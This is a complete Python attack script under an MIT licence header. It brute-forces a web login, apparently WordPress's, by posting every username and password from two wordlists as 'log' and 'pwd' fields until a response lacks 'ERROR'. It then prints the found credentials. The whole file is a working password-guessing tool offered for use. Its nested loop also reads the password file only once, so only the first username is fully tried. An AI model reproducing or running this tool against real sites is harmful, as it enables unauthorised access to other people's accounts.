'''
MIT License
Copyright (c) 2020 5skr0ll3r
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

#!/usr/bin/python3

import requests
import sys
import os

def main():
    url = sys.argv[1]
    name = sys.argv[2]
    pasw = sys.argv[3]

    r = requests.get(url)

    if str(r.status_code) == '200':
        print('Page Found')
        if os.path.exists(name) and os.path.exists(pasw):
            print('Files exist.\n \n Starting..')
            with open(name, 'r') as n:
                with open(pasw, 'r')as p:
                    for i in n.readlines():
                        for x in p.readlines():
                            na = i.strip('\n')
                            ps = x.strip('\n')
                            payload = {'log' : na ,'pwd' : ps}
                            a = requests.post(url, data=payload)
                            print('[*] Trying with Name: ' , na , ' and Pass: ', ps)
                            
                            if not 'ERROR' in a.text:
                                print ('[*] Username found: ',na)
                                print ('[*] Password found: ',ps)
                                exit(0)
                                
main()
